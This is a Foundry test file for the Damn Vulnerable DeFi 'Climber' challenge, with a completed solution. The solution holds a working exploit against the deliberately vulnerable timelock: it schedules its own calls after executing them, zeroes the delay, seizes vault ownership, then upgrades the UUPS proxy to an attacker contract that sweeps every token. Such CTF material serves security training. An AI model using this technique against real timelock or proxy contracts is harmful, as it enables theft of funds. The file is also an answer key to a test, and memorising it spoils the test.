// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        // Deloy the contract that will exploit both the timelock and the proxy
        Exploit exploit = new Exploit();

        // Construct the calls for timelock to execute
        uint256 numberOfCalls = 4;

        address[] memory targets = new address[](numberOfCalls);
        uint256[] memory values = new uint256[](numberOfCalls);
        bytes[] memory dataElements = new bytes[](numberOfCalls);

        bytes32 salt = keccak256("SCHEDULE");

        // Create the call to the timelock to change the delay
        targets[0] = address(timelock);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));

        // Now create the call to grant the exploit contract the PROPOSER_ROLE
        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(exploit));

        // Transfer ownership of the vault to the exploit contract
        targets[2] = address(vault);
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", player);

        // Call the exploit contract to schedule the operation with the adjusted last call
        targets[3] = address(exploit);
        dataElements[3] = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt
        );

        // Execute the calls with ClimberTimelock::execute
        timelock.execute(targets, values, dataElements, salt);

        // Change the implementation of the vault to the Exploit contract and transfer tokens to the recovery account
        vault.upgradeToAndCall(
            address(exploit), abi.encodeWithSelector(Exploit.sweep.selector, token, recovery, VAULT_TOKEN_BALANCE)
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

// This contract is used both as the forwarder to exploit ClimberTimelock and as the new implementation of the vault
// As the new implementation, it does not rely on storage to sweep tokens from the proxy
contract Exploit is UUPSUpgradeable {
    // This function will be called by the timelock to schedule all the previous executed calls as a valid operation
    function schedule(address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt)
        external
    {
        uint256 lastCall = targets.length - 1;

        // Update the last call to schedule the operation with the same id as the executed one
        targets[lastCall] = address(this);
        dataElements[lastCall] = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt
        );

        ClimberTimelock(payable(msg.sender)).schedule(targets, values, dataElements, salt);
    }

    // Used in the delegate call from proxy to sweep tokens
    // Does not rely on storage to avoid clashes
    function sweep(DamnValuableToken _token, address recovery, uint256 amount) external {
        _token.transfer(recovery, amount);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
